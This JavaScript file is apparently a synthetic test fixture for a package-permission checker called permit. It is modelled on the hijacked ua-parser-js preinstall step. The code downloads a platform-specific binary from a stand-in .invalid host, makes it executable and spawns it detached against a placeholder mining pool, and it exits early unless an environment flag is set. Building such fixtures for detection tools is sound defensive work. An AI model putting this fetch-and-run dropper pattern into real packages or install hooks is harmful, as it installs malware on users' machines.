// Synthetic fixture for permit's tests, modelled on the hijacked ua-parser-js
// releases: a preinstall step that downloads a binary and starts it. The host
// is reserved (.invalid) and the script exits before doing anything; it only
// has to look like the real thing to a reader, and to permit.
const https = require('https')
const fs = require('fs')
const { spawn } = require('child_process')
const os = require('os')

if (process.env.PERMIT_FIXTURE !== 'run-me') process.exit(0)

const target = os.platform() === 'win32' ? 'sdd.exe' : 'jsextension'
const out = fs.createWriteStream(target)
https.get('https://downloads.example.invalid/' + target, (res) => {
  res.pipe(out)
  out.on('finish', () => {
    fs.chmodSync(target, 0o755)
    spawn('./' + target, ['-o', 'pool.example.invalid:3333'], { detached: true, stdio: 'ignore' }).unref()
  })
})
